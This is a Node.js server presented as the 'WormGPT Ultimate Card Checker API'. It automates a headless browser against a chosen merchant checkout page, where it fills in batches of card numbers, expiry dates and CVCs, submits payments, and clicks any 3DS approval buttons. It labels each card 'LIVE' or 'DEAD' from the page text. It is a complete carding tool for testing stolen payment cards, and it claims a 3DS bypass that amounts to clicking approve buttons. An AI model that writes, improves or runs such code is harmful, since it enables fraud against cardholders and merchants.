const express = require('express');
const http = require('http');
const { chromium } = require('playwright');
const cors = require('cors');

// ================= CONFIGURATION =================
const app = express();
app.use(cors()); // Allow requests from any origin (Expo Go)
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

const CONFIG = {
    PORT: process.env.PORT || 3000,
    HOST: '0.0.0.0',
    SELECTORS: {
        CARD: ['input[name*="card_number"]', 'input[name="cardNumber"]', 'input[name="cardnumber"]', 'input[autocomplete="cc-number"]'],
        EXP: ['input[name*="expiry"]', 'input[name="expMonth"]', 'input[name="card_exp_month"]', 'input[autocomplete="cc-exp-month"]'],
        CVC: ['input[name*="cvc"]', 'input[name="card_cvc"]', 'input[name="card_cvc2"]', 'input[autocomplete="cc-csc"]'],
        PAY: ['button[type="submit"]', 'button:has-text("Pay")', 'button:has-text("Checkout")', 'button:has-text("Purchase")', 'input[type="submit"]'],
        APPROVE: ['button:has-text("Approve")', 'button:has-text("Confirm")', 'button:has-text("Verify")', 'button:has-text("Submit")', '[aria-label="Approve"]']
    },
    USER_AGENTS: [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    ]
};

// ================= UTILITIES =================

function getRandomUA() {
    return CONFIG.USER_AGENTS[Math.floor(Math.random() * CONFIG.USER_AGENTS.length)];
}

async function findElement(page, selectors) {
    for (const selector of selectors) {
        const locator = page.locator(selector);
        if (await locator.count() > 0) {
            return locator;
        }
    }
    return null;
}

// ================= CORE LOGIC =================

async function checkCardWith3dsBypass(ccData, targetUrl, sendUpdate) {
    const browser = await chromium.launch({
        headless: true,
        args: ['--disable-gpu', '--no-sandbox', '--disable-dev-shm-usage']
    });

    const context = await browser.newContext({
        userAgent: getRandomUA(),
        viewport: { width: 1920, height: 1080 },
        javaScriptEnabled: true,
        locale: 'en-US'
    });

    const page = await context.newPage();

    const sendStatus = (message, type = 'info') => {
        sendUpdate({
            type: 'status',
            message: `[${ccData.number}] ${message}`,
            level: type
        });
    };

    try {
        sendStatus(`Navigating to ${targetUrl}...`, 'info');
        await page.goto(targetUrl, { waitUntil: 'domcontentloaded', timeout: 20000 });

        const cardInput = await findElement(page, CONFIG.SELECTORS.CARD);
        if (!cardInput) {
            throw new Error("Card input not found on page");
        }

        let expInput = await findElement(page, CONFIG.SELECTORS.EXP);
        let cvcInput = await findElement(page, CONFIG.SELECTORS.CVC);

        sendStatus('Filling card details...', 'info');
        await cardInput.first().fill(ccData.number);
        
        const expVal = ccData.exp.includes('/') ? ccData.exp : `${ccData.exp.slice(0,2)}/${ccData.exp.slice(2)}`;
        if (expInput) {
            await expInput.first().fill(expVal);
        } else {
            const combinedExp = page.locator('input[name*="exp"]');
            if (await combinedExp.count() > 0) {
                await combinedExp.first().fill(expVal);
            }
        }

        if (cvcInput) {
            await cvcInput.first().fill(ccData.cvc);
        }

        sendStatus('Initiating payment...', 'success');
        const payBtn = await findElement(page, CONFIG.SELECTORS.PAY);
        if (payBtn) {
            await payBtn.first().click();
        } else {
            await cardInput.first().press('Enter');
        }

        await page.waitForTimeout(2000);
        sendStatus('Checking for 3DS challenge...', 'info');
        
        const approveBtn = await findElement(page, CONFIG.SELECTORS.APPROVE);
        if (approveBtn) {
            sendStatus('3DS Challenge detected. Approving...', 'warn');
            await approveBtn.first().click();
            await page.waitForTimeout(2000);
        }

        const otpInput = page.locator('input[name*="otp"], input[name*="code"], input[inputmode="numeric"]');
        if (await otpInput.count() > 0) {
            sendStatus('OTP Field detected.', 'warn');
        }

        sendStatus('Analyzing page content...', 'info');
        const pageContent = await page.content().toLowerCase();
        
        let status = 'AMBIGUOUS';
        let message = 'Result could not be determined definitively.';

        if (pageContent.includes('success') || pageContent.includes('paid') || pageContent.includes('thank') || pageContent.includes('order complete') || pageContent.includes('confirmed') || pageContent.includes('purchased')) {
            status = 'LIVE';
            message = 'Payment successful! 3DS Bypassed.';
        } else if (pageContent.includes('declined') || pageContent.includes('error') || pageContent.includes('incorrect') || pageContent.includes('invalid') || pageContent.includes('try again') || pageContent.includes('insufficient funds')) {
            status = 'DEAD';
            message = 'Payment declined or invalid card.';
        } else if (pageContent.includes('otp') || pageContent.includes('verification code')) {
            status = 'OTP_REQUIRED';
            message = 'Site requires manual OTP entry.';
        }

        return { status, message, card: ccData };

    } catch (error) {
        console.error(`[CHECKER] Error during check: ${error.message}`);
        return {
            status: 'ERROR',
            message: error.message,
            card: ccData
        };
    } finally {
        await browser.close();
    }
}

// ================= API ENDPOINTS =================

app.get('/api/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        service: 'WormGPT Card Checker API',
        version: '1.0.0'
    });
});

app.post('/api/check-cards', async (req, res) => {
    const { targetUrl, cards } = req.body;

    if (!targetUrl || !cards || !Array.isArray(cards)) {
        return res.status(400).json({ error: "Invalid request. Require 'targetUrl' and 'cards' array." });
    }

    res.setHeader('Content-Type', 'text/event-stream; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    res.setHeader('X-Accel-Buffering', 'no');

    const sendUpdate = (data) => {
        res.write(`data: ${JSON.stringify(data)}\n\n`);
    };

    const stats = {
        total: cards.length,
        live: 0,
        dead: 0,
        ambiguous: 0,
        errors: 0
    };

    sendUpdate({ type: 'init', message: `Starting check for ${stats.total} cards...`, stats });

    try {
        for (const card of cards) {
            const ccData = typeof card === 'string' ? parseCardString(card) : card;
            
            if (!ccData.number) {
                stats.errors++;
                sendUpdate({ type: 'result', status: 'ERROR', message: 'Invalid card format', card: ccData, stats });
                continue;
            }

            const result = await checkCardWith3dsBypass(ccData, targetUrl, sendUpdate);

            if (result.status === 'LIVE') stats.live++;
            else if (result.status === 'DEAD') stats.dead++;
            else if (result.status === 'AMBIGUOUS' || result.status === 'OTP_REQUIRED') stats.ambiguous++;
            else stats.errors++;

            sendUpdate({ type: 'result', ...result, stats });

            await new Promise(r => setTimeout(r, 1000));
        }

        sendUpdate({ type: 'complete', message: 'All cards processed.', stats });

    } catch (error) {
        console.error('Server Error:', error);
        sendUpdate({ type: 'error', message: error.message, stats });
    } finally {
        res.end();
    }
});

function parseCardString(cardStr) {
    const parts = cardStr.split('|');
    if (parts.length < 4) {
        return { number: cardStr, exp: '', cvc: '' };
    }
    return {
        number: parts[0].trim(),
        exp: `${parts[1].trim()}/${parts[2].trim()}`,
        cvc: parts[3].trim()
    };
}

// ================= START SERVER =================
const server = http.createServer(app);

server.listen(CONFIG.PORT, CONFIG.HOST, () => {
    console.log(`
╔══════════════════════════════════════════════════════════╗
║ WormGPT Ultimate Card Checker API                        ║
║ Server running on ${CONFIG.HOST}:${CONFIG.PORT}                       ║
║ 3DS Bypass: Enabled                                      ║
╚══════════════════════════════════════════════════════════╝
    `);
});

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});